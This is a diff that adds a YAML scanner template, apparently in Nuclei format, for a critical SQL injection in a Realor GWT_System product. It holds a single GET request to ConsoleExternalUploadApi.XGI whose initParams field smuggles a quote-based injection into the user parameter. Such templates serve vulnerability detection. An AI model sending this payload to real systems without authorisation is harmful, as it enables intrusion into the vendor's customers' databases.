@@ -1,0 +1,13 @@
+id: yaml-poc-realor-gwt_system-sql_injection-CT-683765
+info:
+  name: Yaml Poc Realor Gwt_System Sql_Injection Ct 683765
+  author: jiapeng.han
+  severity: critical
+  description: 'Converted from xpoc: yaml-poc-realor-gwt_system-sql_injection-CT-683765'
+  tags: sqli
+  reference:
+  - https://mp.weixin.qq.com/s/zeH6p5lFQ4kzu5HpfTpXog
+http:
+- method: GET
+  path:
+  - /ConsoleExternalUploadApi.XGI?key=FarmName&initParams=command_uploadAuthorizeKeyFile__user_admin%27-%27__pwd_password123__serverIdStr_1&sign=7627a11bf8f214451e7929f05299b9f6
